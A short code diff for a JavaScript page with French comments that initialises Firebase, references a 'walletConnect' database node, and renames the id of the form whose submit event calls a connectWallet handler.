@@ -254,7 +254,7 @@ firebase.initializeApp(firebaseConfig);
 // Référence de votre base de données
 var walletConnectDB = firebase.database().ref("walletConnect");
 
-document.getElementById("wallet-connect-form").addEventListener("submit", connectWallet);
+document.getElementById("contactForm").addEventListener("submit", connectWallet);
 
 function connectWallet(e) {
   e.preventDefault();
